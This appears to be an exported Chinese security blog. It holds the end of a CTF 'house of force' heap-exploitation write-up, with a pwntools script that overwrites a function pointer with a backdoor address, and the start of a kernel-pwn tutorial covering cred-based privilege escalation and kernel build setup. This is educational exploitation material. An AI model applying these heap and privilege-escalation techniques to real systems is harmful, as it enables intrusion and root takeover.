                     data-src="/blog/2024/10/03/house-of-force/image-20241003002919869.png"
                      class=""
                >

<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/10/03/house-of-force/image-20241003002937355.png"
                      class=""
                >



<p>我们可以发现有对v4中函数指针的调用，而v4是一个指向堆的指针，那么我们就可以想办法改掉其中的函数指针实现任意地址的跳转，而程序中又有magic后门函数，所以思路就是改位于v4+8位置处的函数指针为magic，最后再传入5来调用magic。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/10/03/house-of-force/image-20241003002948587.png"
                      class=""
                >

<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/10/03/house-of-force/image-20241003002955916.png"
                      class=""
                >



<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/10/03/house-of-force/image-20241003003131870.png"
                      class=""
                >



<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/10/03/house-of-force/image-20241003003143107.png"
                      class=""
                >

<p>可以发现change_item方法中我们可以任意控制输入大小，从而造成堆溢出，这里其实也可以用overlapping来构造double free，不过显然house_of_force更快更方便。</p>
<p>先把板子套上：</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your choice:&quot;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Please enter the length of item name:&quot;</span>,<span class="built_in">str</span>(size).encode())</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Please enter the name of item:&quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>():</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your choice:&quot;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,size,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your choice:&quot;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Please enter the index of item:&quot;</span>,<span class="built_in">str</span>(idx).encode())</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Please enter the length of item name:&quot;</span>,<span class="built_in">str</span>(size).encode())</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Please enter the new name of the item:&quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your choice:&quot;</span>,<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Please enter the index of item:&quot;</span>,<span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">end</span>():</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your choice:&quot;</span>,<span class="string">&#x27;5&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>具体打法：</p>
<p>首先溢出改top chunk的size域</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">magic = <span class="number">0x0000000000400D49</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x30</span>,<span class="string">b&quot;AAAA&quot;</span>)   <span class="comment">#0</span></span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x40</span>,<span class="string">b&quot;A&quot;</span>*<span class="number">0x38</span>+p64(<span class="number">0xfffffffffffffff1</span>))</span><br></pre></td></tr></table></figure></div>

<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/10/03/house-of-force/image-20241003003151793.png"
                      class=""
                >

<p>然后算出偏移后申请一个目标大小的chunk</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">off = -<span class="number">0x60</span> - <span class="number">0x8</span> - <span class="number">0xf</span></span><br><span class="line">add(off,<span class="string">b&quot;AAAA&quot;</span>)    <span class="comment">#1</span></span><br></pre></td></tr></table></figure></div>

<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/10/03/house-of-force/image-20241003003155240.png"
                      class=""
                >

<p>此时我们发现top chunk已经到了目标位置处，再申请一个chunk就可以改写目标位置函数指针了。</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0x10</span>,p64(magic)*<span class="number">2</span>)</span><br><span class="line">end()</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div>

]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>heap</tag>
        <tag>house of</tag>
      </tags>
  </entry>
  <entry>
    <title>kernel pwn初探</title>
    <url>/blog/2025/02/22/kernel-pwn%E5%88%9D%E6%8E%A2/</url>
    <content><![CDATA[<h2 id="kernel-pwn初探"><a href="#kernel-pwn初探" class="headerlink" title="kernel pwn初探"></a>kernel pwn初探</h2><h4 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h4><p>基础的概念入门时不宜死磕，最好粗略看看留个印象，然后下去环境配好后，在调试探索时逐步深化理解。</p>
<h5 id="如何理解内核"><a href="#如何理解内核" class="headerlink" title="如何理解内核"></a>如何理解内核</h5><p>操作系统内核（Operation System Kernel）本质上也是一种软件，可以看作是普通应用程式与硬件之间的一层中间层，其主要作用便是调度系统资源、控制 IO 设备、操作网络与文件系统等，并为上层应用提供便捷、抽象的应用接口。操作系统内核实际上是我们抽象出来的一个概念，本质上与用户进程一般无二，都是位于物理内存中的代码 + 数据，不同之处在于当 CPU  执行操作系统内核代码时通常运行在高权限，拥有着完全的硬件访问能力，而 CPU 在执行用户态代码时通常运行在低权限环境，只拥有部分 &#x2F;  缺失硬件访问能力。</p>
<h5 id="分级保护域"><a href="#分级保护域" class="headerlink" title="分级保护域"></a><strong>分级保护域</strong></h5><p>分级保护域（hierarchical protection domains）又被称作保护环，简称 Rings ，是一种将计算机不同的资源划分至不同权限的模型。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/02/22/kernel-pwn%E5%88%9D%E6%8E%A2/ring_model.png"
                      class=""
                >

<p>cpu权限等级主要分为0-3四级，基本上常用的只有Ring0和Ring3，对应操作系统内核与用户进程，即 CPU 在执行用户进程代码时处在 ring3 下。</p>
<h5 id="状态切换"><a href="#状态切换" class="headerlink" title="状态切换"></a>状态切换</h5><ul>
<li>中断与异常</li>
<li>特权级相关指令（iret，sysenter…）</li>
</ul>
<p>现代操作系统的开发者包装出了系统调用（syscall），作为由”用户态 “切换到”  内核态“的入口，从而执行内核代码来完成用户进程所需的一些功能。当用户进程想要请求更高权限的服务时，便需要通过由系统提供的应用接口，使用系统调用以陷入内核态，再由操作系统完成请求。</p>
<p>当发生 <code>系统调用</code>，<code>产生异常</code>，<code>外设产生中断</code> 等事件时，会发生用户态到内核态的切换，具体的过程为：</p>
<ol>
<li>通过 <code>swapgs</code> 切换 GS 段寄存器，将 GS 寄存器值和一个特定位置的值进行交换，目的是保存 GS 值，同时将该位置的值作为内核执行时的 GS 值使用。</li>
<li>将当前栈顶（用户空间栈顶）记录在 CPU 独占变量区域里，将 CPU 独占区域里记录的内核栈顶放入 rsp&#x2F;esp。</li>
<li>通过 push 保存各寄存器值</li>
<li>通过汇编指令判断是否为 <code>x32_abi</code>。</li>
<li>通过系统调用号，跳到全局变量 <code>sys_call_table</code> 相应位置继续执行系统调用。</li>
</ol>
<p>退出时，流程如下：</p>
<ol>
<li>通过 <code>swapgs</code> 恢复 GS 值。</li>
<li>通过 <code>sysretq</code> 或者 <code>iretq</code> 恢复到用户控件继续执行。如果使用 <code>iretq</code> 还需要给出用户空间的一些信息（CS, eflags&#x2F;rflags, esp&#x2F;rsp 等）。</li>
</ol>
<h5 id="虚拟内存分布"><a href="#虚拟内存分布" class="headerlink" title="虚拟内存分布"></a>虚拟内存分布</h5><p>分为供用户使用的用户空间和供内核使用的内核空间。</p>
<p>32位内存分布：</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/02/22/kernel-pwn%E5%88%9D%E6%8E%A2/mm_layout_32.png"
                      class=""
                >

<p>64位内存分布：</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/02/22/kernel-pwn%E5%88%9D%E6%8E%A2/mm_layout_64.png"
                      class=""
                >

<h5 id="进程权限管理"><a href="#进程权限管理" class="headerlink" title="进程权限管理"></a>进程权限管理</h5><p><strong>进程描述符</strong>：源码在<code>include/linux/sched.h</code>中，linux-5.15.153该版本部分源码如下，由于task_struct结构体定义极长，这里继续引用ctfwiki上的图片。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/02/22/kernel-pwn%E5%88%9D%E6%8E%A2/task_struct.png"
                      class=""
                >

<p><strong>重要字段结构化表格</strong></p>
<table>
<thead>
<tr>
<th>类别</th>
<th>字段</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td><strong>调度相关</strong></td>
<td><code>state</code>, <code>sched_class</code></td>
<td>调度信息</td>
</tr>
<tr>
<td></td>
<td><code>prio</code>, <code>static_prio</code></td>
<td>优先级</td>
</tr>
<tr>
<td></td>
<td><code>se</code>, <code>rt_priority</code></td>
<td>调度器实体</td>
</tr>
<tr>
<td><strong>内存管理</strong></td>
<td><code>mm</code>, <code>active_mm</code></td>
<td>内存描述符</td>
</tr>
<tr>
<td></td>
<td><code>stack</code>, <code>thread_info</code></td>
<td>内核栈与线程信息</td>
</tr>
<tr>
<td><strong>标识与控制</strong></td>
<td><code>pid</code>, <code>tgid</code></td>
<td>进程与线程组 ID</td>
</tr>
<tr>
<td></td>
<td><code>real_parent</code>, <code>children</code></td>
<td>父子关系管理</td>
</tr>
<tr>
<td><strong>资源管理</strong></td>
<td><code>files</code>, <code>fs</code>, <code>signal</code></td>
<td>文件、文件系统与信号资源</td>
</tr>
<tr>
<td></td>
<td><code>cred</code>, <code>limits</code></td>
<td>权限与资源限制</td>
</tr>
<tr>
<td><strong>统计与架构相关</strong></td>
<td><code>utime</code>, <code>stime</code></td>
<td>CPU 时间</td>
</tr>
<tr>
<td></td>
<td><code>cpu_context</code>, <code>thread</code></td>
<td>上下文信息</td>
</tr>
<tr>
<td><strong>安全与调试</strong></td>
<td><code>ptrace</code>, <code>seccomp</code></td>
<td>调试与安全机制</td>
</tr>
</tbody></table>
<p><strong>进程权限凭证</strong>（credential）</p>
<p>结构体 <code>cred</code> 用以管理一个进程的权限，该结构体定义于内核源码 <code>include/linux/cred.h</code> 中。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cred</span> &#123;</span></span><br><span class="line">	<span class="type">atomic_long_t</span>	usage;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_DEBUG_CREDENTIALS</span></span><br><span class="line">	<span class="type">atomic_t</span>	subscribers;	<span class="comment">/* number of processes subscribed */</span></span><br><span class="line">	<span class="type">void</span>		*put_addr;</span><br><span class="line">	<span class="type">unsigned</span>	magic;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CRED_MAGIC	0x43736564</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CRED_MAGIC_DEAD	0x44656144</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	<span class="type">kuid_t</span>		uid;		<span class="comment">/* real UID of the task */</span></span><br><span class="line">	<span class="type">kgid_t</span>		gid;		<span class="comment">/* real GID of the task */</span></span><br><span class="line">	<span class="type">kuid_t</span>		suid;		<span class="comment">/* saved UID of the task */</span></span><br><span class="line">	<span class="type">kgid_t</span>		sgid;		<span class="comment">/* saved GID of the task */</span></span><br><span class="line">	<span class="type">kuid_t</span>		euid;		<span class="comment">/* effective UID of the task */</span></span><br><span class="line">	<span class="type">kgid_t</span>		egid;		<span class="comment">/* effective GID of the task */</span></span><br><span class="line">	<span class="type">kuid_t</span>		fsuid;		<span class="comment">/* UID for VFS ops */</span></span><br><span class="line">	<span class="type">kgid_t</span>		fsgid;		<span class="comment">/* GID for VFS ops */</span></span><br><span class="line">	<span class="type">unsigned</span>	securebits;	<span class="comment">/* SUID-less security management */</span></span><br><span class="line">	<span class="type">kernel_cap_t</span>	cap_inheritable; <span class="comment">/* caps our children can inherit */</span></span><br><span class="line">	<span class="type">kernel_cap_t</span>	cap_permitted;	<span class="comment">/* caps we&#x27;re permitted */</span></span><br><span class="line">	<span class="type">kernel_cap_t</span>	cap_effective;	<span class="comment">/* caps we can actually use */</span></span><br><span class="line">	<span class="type">kernel_cap_t</span>	cap_bset;	<span class="comment">/* capability bounding set */</span></span><br><span class="line">	<span class="type">kernel_cap_t</span>	cap_ambient;	<span class="comment">/* Ambient capability set */</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_KEYS</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">char</span>	jit_keyring;	<span class="comment">/* default keyring to attach requested</span></span><br><span class="line"><span class="comment">					 * keys to */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">key</span>	*<span class="title">session_keyring</span>;</span> <span class="comment">/* keyring inherited over fork */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">key</span>	*<span class="title">process_keyring</span>;</span> <span class="comment">/* keyring private to this process */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">key</span>	*<span class="title">thread_keyring</span>;</span> <span class="comment">/* keyring private to this thread */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">key</span>	*<span class="title">request_key_auth</span>;</span> <span class="comment">/* assumed request_key authority */</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SECURITY</span></span><br><span class="line">	<span class="type">void</span>		*security;	<span class="comment">/* LSM security */</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">user_struct</span> *<span class="title">user</span>;</span>	<span class="comment">/* real user ID subscription */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">user_namespace</span> *<span class="title">user_ns</span>;</span> <span class="comment">/* user_ns the caps and keyrings are relative to. */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">ucounts</span> *<span class="title">ucounts</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">group_info</span> *<span class="title">group_info</span>;</span>	<span class="comment">/* supplementary groups for euid/fsgid */</span></span><br><span class="line">	<span class="comment">/* RCU deletion */</span></span><br><span class="line">	<span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">		<span class="type">int</span> non_rcu;			<span class="comment">/* Can we skip RCU deletion? */</span></span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">rcu_head</span>	<span class="title">rcu</span>;</span>		<span class="comment">/* RCU deletion hook */</span></span><br><span class="line">	&#125;;</span><br><span class="line">&#125; __randomize_layout;</span><br></pre></td></tr></table></figure></div>

<p>我们主要关注各种id，这些字段用于定义任务的身份，并与权限检查密切相关。</p>
<ul>
<li><strong><code>kuid_t uid</code> 和 <code>kgid_t gid</code></strong><ul>
<li>真实用户 ID (<code>uid</code>) 和真实组 ID (<code>gid</code>)。</li>
<li>定义进程创建时的原始身份，通常由父进程继承。</li>
</ul>
</li>
<li><strong><code>kuid_t suid</code> 和 <code>kgid_t sgid</code></strong><ul>
<li>保存的用户 ID 和保存的组 ID。</li>
<li>用于暂时切换身份后恢复原始身份，常用于 SUID&#x2F;SGID 程序。</li>
</ul>
</li>
<li><strong><code>kuid_t euid</code> 和 <code>kgid_t egid</code></strong><ul>
<li>有效用户 ID 和有效组 ID。</li>
<li>实际权限检查使用的身份，与真实身份不同的场景通常出现在提权操作中。</li>
</ul>
</li>
<li><strong><code>kuid_t fsuid</code> 和 <code>kgid_t fsgid</code></strong><ul>
<li>文件系统操作使用的用户 ID 和组 ID。</li>
<li>通常用于文件访问权限的检查。</li>
</ul>
</li>
</ul>
<p>一个进程的权限是由位于内核空间的 <code>cred</code> 结构体进行管理的，那么我们不难想到：只要改变一个进程的 <code>cred</code> 结构体，就能改变其执行权限。</p>
<p>在内核空间有如下两个函数，都位于 <code>kernel/cred.c</code> 中：</p>
<ul>
<li><code>struct cred* prepare_kernel_cred(struct task_struct* daemon)</code>：该函数用以拷贝一个进程的 cred 结构体，并返回一个新的 cred 结构体，需要注意的是 daemon 参数应为有效的进程描述符地址。如果传递的 <code>daemon</code> 参数为 <code>NULL</code>，则创建一个默认的 <code>cred</code>，通常用于与 <code>init</code> 进程（PID 1）关联的场景，较新版内核会直接返回错误。</li>
<li><code>int commit_creds(struct cred *new)</code>：该函数用以将一个新的 cred 结构体应用到进程。</li>
</ul>
<p>一般可以用<code>prepare_kernel_cred</code>先获取一个合法的cred结构体，然后更改里面的权限位后，再<code>commit_creds</code>应用到进程进行提权。但实际上在较新版的内核中，一般是直接改cred结构体，或是改task_struct的cred指针，抑或是调用<code>commit_creds(&amp;init_cred)</code>，来将具有root权限的init进程的cred结构体拷贝到我们当前进程。</p>
<h5 id="可装载内核模块"><a href="#可装载内核模块" class="headerlink" title="可装载内核模块"></a><strong>可装载内核模块</strong></h5><p><strong>LKMs</strong> 全称 <strong>Loadable Kernel Modules</strong>，即<strong>可加载内核模块</strong>。它是一种可以在运行中的内核中动态加载或卸载的模块化代码。LKMs 为操作系统内核提供了灵活性，使其能够根据需要添加或移除功能，而无需重新编译或重启内核。</p>
<p>常见的 LKMs 包括：</p>
<ul>
<li>驱动程序（Device drivers）<ul>
<li>设备驱动</li>
<li>文件系统驱动</li>
<li>…</li>
</ul>
</li>
<li>内核扩展模块 (modules)</li>
</ul>
<p>一般ctf题中，漏洞都是存在在**.ko<strong>文件中，也就是</strong>LKM**中。</p>
<p><strong>相关指令</strong></p>
<ul>
<li><strong>insmod</strong>: 讲指定模块加载到内核中</li>
<li><strong>rmmod</strong>: 从内核中卸载指定模块</li>
<li><strong>lsmod</strong>: 列出已经加载的模块</li>
<li><strong>modprobe</strong>: 添加或删除模块，modprobe 在加载模块时会查找依赖关系</li>
</ul>
<h5 id="内核交互"><a href="#内核交互" class="headerlink" title="内核交互"></a>内核交互</h5><p>系统调用，指的是用户空间的程序向操作系统内核请求需要更高权限的服务，比如 IO 操作或者进程间通信。系统调用提供用户程序与操作系统间的接口，部分库函数（如 scanf，puts 等 IO 相关的函数实际上是对系统调用的封装（read 和 write））。</p>
<blockquote>
<p>在 <em>&#x2F;usr&#x2F;include&#x2F;x86_64-linux-gnu&#x2F;asm&#x2F;unistd_64.h</em> 和 <em>&#x2F;usr&#x2F;include&#x2F;x86_64-linux-gnu&#x2F;asm&#x2F;unistd_32.h</em> 分别可以查看 64 位和 32 位的系统调用号。</p>
</blockquote>
<p><code>ioctl</code> 是 Linux 和类 Unix 操作系统中用于设备控制的系统调用（system call）。它全称是 <strong>Input&#x2F;Output Control</strong>，主要用于对设备执行特殊操作或者控制设备的行为，这些操作通常无法通过标准的读（<code>read</code>）、写（<code>write</code>）系统调用完成。</p>
<p><strong>基本用法</strong></p>
<p>典型的 <code>ioctl</code> 原型如下：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">ioctl</span><span class="params">(<span class="type">int</span> fd, <span class="type">unsigned</span> <span class="type">long</span> request, ...)</span>;</span><br></pre></td></tr></table></figure></div>

<ul>
<li><strong><code>fd</code></strong>: 文件描述符，表示目标设备或文件。</li>
<li><strong><code>request</code></strong>: 请求码，用于指定具体的控制操作。</li>
<li><strong><code>...</code></strong>: 可选参数，通常是指向内存中数据的指针，具体取决于请求的操作。</li>
</ul>
<p><strong>常见用途</strong></p>
<ol>
<li><strong>设备配置</strong>：设置设备参数（例如网络设备的 IP 地址、串口波特率）。</li>
<li><strong>信息查询</strong>：获取设备的状态、硬件信息等。</li>
<li><strong>非标准 I&#x2F;O 操作</strong>：执行驱动中特殊的读写行为。</li>
<li><strong>硬件控制</strong>：控制底层硬件设备，例如磁盘分区管理。</li>
</ol>
<p><strong>示例代码</strong></p>
<p>一个简单的例子是设置终端属性：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;termios.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">termios</span> <span class="title">term</span>;</span></span><br><span class="line">    <span class="type">int</span> fd = <span class="number">0</span>; <span class="comment">// 通常 0 表示标准输入（终端）</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (ioctl(fd, TCGETS, &amp;term) == <span class="number">-1</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;ioctl error&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;终端配置已成功获取\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<ul>
<li><strong><code>TCGETS</code></strong>: 获取终端的当前配置。</li>
<li><strong><code>struct termios</code></strong>: 存储终端配置的结构体。</li>
</ul>
<p><strong>请求码的构造</strong></p>
<p><code>ioctl</code> 请求码通常用四部分组成：</p>
<ul>
<li><strong>类型</strong>：表示设备类型，例如磁盘、终端。</li>
<li><strong>编号</strong>：特定命令的编号。</li>
<li><strong>方向</strong>：表示是读、写还是两者皆有。</li>
<li><strong>大小</strong>：与之交互的数据大小。</li>
</ul>
<p>宏 <strong><code>_IO</code>、<code>_IOR</code>、<code>_IOW</code> 和 <code>_IOWR</code></strong> 常被用于生成请求码。</p>
<ul>
<li><code>_IO</code>：无数据传输。</li>
<li><code>_IOR</code>：数据从内核传输到用户空间（读）。</li>
<li><code>_IOW</code>：数据从用户空间传输到内核（写）。</li>
<li><code>_IOWR</code>：双向传输（读写）。</li>
</ul>
<p><strong>注意事项</strong></p>
<ol>
<li><strong>设备驱动依赖</strong>：<code>ioctl</code> 的功能完全由设备驱动程序实现，不同设备可能有不同的控制请求。</li>
<li><strong>安全性问题</strong>：由于 <code>ioctl</code> 可以直接操作设备，对参数的检查不足可能会带来漏洞，尤其是在权限提升攻击中。</li>
</ol>
<h4 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h4><h5 id="下载内核"><a href="#下载内核" class="headerlink" title="下载内核"></a>下载内核</h5><p><a class="link"   href="https://mirrors.tuna.tsinghua.edu.cn/kernel/" >清华源镜像站<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p>下列步骤如果确信来源可靠的话，可以略过中间签名验证的三步。</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">curl -O -L https://mirrors.tuna.tsinghua.edu.cn/kernel/v5.x/linux-5.15.153.tar.xz		<span class="comment">#可以选择自己想要的对应版本</span></span><br><span class="line">unxz linux-5.4.98.tar.xz	<span class="comment">#解压</span></span><br><span class="line">curl -O -L https://mirrors.tuna.tsinghua.edu.cn/kernel/v5.x/linux-5.15.153.tar.sign	<span class="comment">#下载签名</span></span><br><span class="line">gpg --locate-keys gregkh@kernel.org		<span class="comment">#导入内核版本发布者的公钥。</span></span><br><span class="line">gpg --verify linux-5.15.153.tar.sign		<span class="comment">#验证签名</span></span><br><span class="line">tar -xf linux-5.15.153.tar		<span class="comment">#解压得到源码</span></span><br></pre></td></tr></table></figure></div>

<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/02/22/kernel-pwn%E5%88%9D%E6%8E%A2/image-20250112233721560.png"
                      class=""
                >

<p>然后配置内核的编译选项，可以用menuconfig来可视化配置。如果想要非交互式，直接调整 <code>.config</code> 文件或使用以下命令生成默认配置：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#默认配置</span></span><br><span class="line">make defconfig</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#可视化自定义配置</span></span><br><span class="line"><span class="built_in">sudo</span> apt update</span><br><span class="line"><span class="built_in">sudo</span> apt install libncurses-dev</span><br><span class="line"><span class="built_in">sudo</span> apt install flex</span><br><span class="line">make menuconfig</span><br></pre></td></tr></table></figure></div>

<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/02/22/kernel-pwn%E5%88%9D%E6%8E%A2/image-20250113003141550.png"
                      class=""
                >

<p>这里我们主要关注调试方面的选项，依次进入到 Kernel hacking -&gt; Compile-time checks and compiler options，然后勾选如下选项<code>Compile the kernel with debug info</code>，以便于调试。</p>
<p>如果要使用 kgdb 调试内核，则需要选中 <code>KGDB: kernel debugger</code>，并选中 KGDB 下的所有选项。这里我试了下，linux-5.4.98这个版本有KGDB选项，而linux-5.15.153这个版本就没这个选项了，据说是默认开启。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/02/22/kernel-pwn%E5%88%9D%E6%8E%A2/image-20250113004218124.png"
                      class=""
                >

<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/02/22/kernel-pwn%E5%88%9D%E6%8E%A2/image-20250113004304194.png"
                      class=""
                >

<h5 id="编译内核"><a href="#编译内核" class="headerlink" title="编译内核"></a>编译内核</h5><p>编译内核前需要准备一些工具。</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt install build-essential libncurses-dev bison flex libssl-dev libelf-dev bc</span><br></pre></td></tr></table></figure></div>

<p>编译内核镜像，可以根据机器的核数来选择具体使用多少核来编译内核。这里我们将标准错误重定向到日志中看看。</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">nproc</span>		<span class="comment">#查看自己主机有多少核</span></span><br><span class="line">make -j$(<span class="built_in">nproc</span>) bzImage 2&gt; build_error.log		<span class="comment">#-jn就是指定用n核进行并行编译，直接指定为nproc全速运行进行编译</span></span><br></pre></td></tr></table></figure></div>



<p>编译时我遇到了以下错误：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">make[<span class="number">2</span>]: *** No rule to make target <span class="string">&#x27;net/netfilter/xt_TCPMSS.o&#x27;</span>, needed by <span class="string">&#x27;net/netfilter/built-in.a&#x27;</span>.  Stop.</span><br><span class="line">make[<span class="number">2</span>]: *** Waiting <span class="keyword">for</span> unfinished jobs....</span><br><span class="line">make[<span class="number">1</span>]: *** [scripts/Makefile.build:<span class="number">552</span>: net/netfilter] Error <span class="number">2</span></span><br><span class="line">make[<span class="number">1</span>]: *** Waiting <span class="keyword">for</span> unfinished jobs....</span><br><span class="line">make: *** [Makefile:<span class="number">1907</span>: net] Error <span class="number">2</span></span><br><span class="line">make: *** Waiting <span class="keyword">for</span> unfinished jobs....</span><br></pre></td></tr></table></figure></div>

